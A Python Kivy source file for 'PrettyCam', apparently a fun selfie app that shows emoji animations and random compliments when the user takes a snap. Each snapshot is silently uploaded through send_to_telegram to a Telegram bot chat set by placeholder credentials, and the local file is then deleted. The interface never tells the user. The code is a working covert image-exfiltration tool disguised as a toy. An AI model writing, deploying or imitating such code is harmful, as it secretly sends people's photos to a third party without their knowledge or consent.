import cv2
import time
import random
import os
import requests

from kivy.app import App
from kivy.clock import Clock
from kivy.uix.image import Image
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.floatlayout import FloatLayout
from kivy.graphics.texture import Texture
from kivy.animation import Animation
from kivy.uix.popup import Popup

# Telegram details
BOT_TOKEN = 'your_bot_token'
CHAT_ID = 'your_chat_id'

# Funny compliments
COMPLIMENTS = [
    "You so photogenic 😍",
    "WERK it 💃",
    "Model energy activated 😎",
    "You just broke the camera 🔥",
    "Stop being so cute 😩",
    "That face needs its own filter 👑",
    "Is that Beyoncé? 😳",
    "Smile, superstar! 🌟",
]

# Floating emojis
EMOJIS = ["😎", "😂", "✨", "💖", "📸", "😜", "🐸", "🤳", "🥰"]

class PrettyCam(App):
    def build(self):
        self.capture = cv2.VideoCapture(0)
        self.layout = FloatLayout()
        self.img_widget = Image(size_hint=(1, 1), allow_stretch=True)
        self.layout.add_widget(self.img_widget)

        # Floating emojis
        self.emoji_labels = []
        for _ in range(5):
            emoji = Label(text=random.choice(EMOJIS), font_size='32sp',
                          size_hint=(None, None),
                          pos_hint={'center_x': random.random(), 'center_y': random.random()})
            self.layout.add_widget(emoji)
            self.emoji_labels.append(emoji)
            self.float_emoji(emoji)

        # SNAP Button
        self.snap_button = Button(
            text="📸 Take Snap",
            font_size='20sp',
            size_hint=(0.5, 0.15),
            pos_hint={'center_x': 0.5, 'y': 0.05},
            background_color=(1, 0.5, 0.8, 1),
            background_normal='',
            color=(1, 1, 1, 1)
        )
        self.snap_button.bind(on_press=self.animate_and_snap)
        self.layout.add_widget(self.snap_button)

        Clock.schedule_interval(self.update, 1.0 / 30.0)
        return self.layout

    def update(self, dt):
        ret, frame = self.capture.read()
        if ret:
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            frame = cv2.flip(frame, 0)
            buf = frame.tobytes()
            texture = Texture.create(size=(frame.shape[1], frame.shape[0]), colorfmt='rgb')
            texture.blit_buffer(buf, colorfmt='rgb', bufferfmt='ubyte')
            self.img_widget.texture = texture

    def animate_and_snap(self, instance):
        anim = Animation(size_hint=(0.55, 0.17), duration=0.1) + Animation(size_hint=(0.5, 0.15), duration=0.1)
        anim.start(instance)
        self.take_picture()

    def float_emoji(self, emoji_label):
        # Animate emoji to random position repeatedly
        new_x = random.uniform(0.1, 0.9)
        new_y = random.uniform(0.4, 0.9)
        anim = Animation(pos_hint={'center_x': new_x, 'center_y': new_y}, duration=random.uniform(2, 5))
        anim.bind(on_complete=lambda *a: self.float_emoji(emoji_label))
        anim.start(emoji_label)

    def take_picture(self):
        ret, frame = self.capture.read()
        if ret:
            filename = "captured_image.jpg"
            cv2.imwrite(filename, frame)
            compliment = random.choice(COMPLIMENTS)
            self.show_popup(compliment)
            self.send_to_telegram(filename)

    def send_to_telegram(self, filepath):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        try:
            with open(filepath, 'rb') as photo:
                response = requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo})
                if response.status_code == 200:
                    print("✅ Sent to Telegram!")
                    os.remove(filepath)
                else:
                    print(f"❌ Failed to send: {response.text}")
        except Exception as e:
            print(f"⚠️ Error: {e}")

    def show_popup(self, msg):
        popup = Popup(title='✨ SNAP TAKEN!',
                      content=Label(text=msg, font_size='20sp'),
                      size_hint=(None, None), size=(300, 200))
        popup.open()
        Clock.schedule_once(lambda dt: popup.dismiss(), 2)

if __name__ == '__main__':
    PrettyCam().run()
